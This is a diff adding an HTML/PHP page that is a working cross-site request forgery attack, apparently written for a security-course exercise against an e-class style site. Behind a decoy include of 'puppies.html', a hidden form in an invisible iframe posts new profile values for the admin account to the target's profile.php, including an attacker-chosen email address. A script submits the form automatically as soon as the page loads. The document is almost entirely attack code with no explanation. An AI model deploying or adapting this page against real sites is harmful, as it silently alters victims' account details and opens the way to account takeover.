@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	 <?php 
+	 include("puppies.html");
+	 ?>
+<html>
+
+
+<head>
+</head>
+
+<body>
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="post" id="frm1" target="csrf-frame" action="http://illegalskillsexception.csec.chatzi.org/modules/profile/profile.php?submit=yes"><br/>
+<div style="display: none;">
+    <table width="99%">
+    <tbody><tr>
+       <th width="220" class='left'>Όνομα</th><td><input class='FormData_InputText' type="hidden" size="40" name="prenom_form" value="admin"></td></tr>
+    <tr>
+       <th class='left'>Επώνυμο</th><td><input class='FormData_InputText' type="hidden" size="40" name="nom_form" value="adminlast4"></td></tr><tr>
+       <th class='left'>Όνομα χρήστη (username)</th>
+       <td><input class='FormData_InputText' type="hidden" size="40" name="username_form" value="admin"></td>
+    </tr><tr><th class='left'>email</th><td><input class='FormData_InputText' type="hidden" size="40" name="email_form" value="yo@y.com"></td></tr><tr>
+        <th class='left'>Αριθμός μητρώου</th>
+        <td><input class='FormData_InputText' type="hidden" size="40" name="am_form" value=""></td>
+    </tr><tr><th class='left'>Αλλαγή εμφάνισης χαρτοφυλακίου</th><td>
+		<input class='FormData_InputText' type=radio name='persoStatus' value='no' >Αναλυτικό&nbsp;
+		<input class='FormData_InputText' type=radio name='persoStatus' value='yes' checked>Συνοπτικό
+		</td>
+    </tr>
+    <tr>
+      <th class='left'>Γλώσσα</th>
+      <td>
+	  <select name='userLanguage'  class='auth_input'>
+		<option selected value='el'>Ελληνικά</option>
+		<option value='en'>English</option>
+		<option value='es'>Español</option>
+	</select>
+
+      </td>
+    </tr>
+
+    </tbody>
+    </table>
+</div>
+</form>
+
+
+  <script>document.getElementById('frm1').submit();</script>
+      </body>
+	  
+	  
+
+</html>
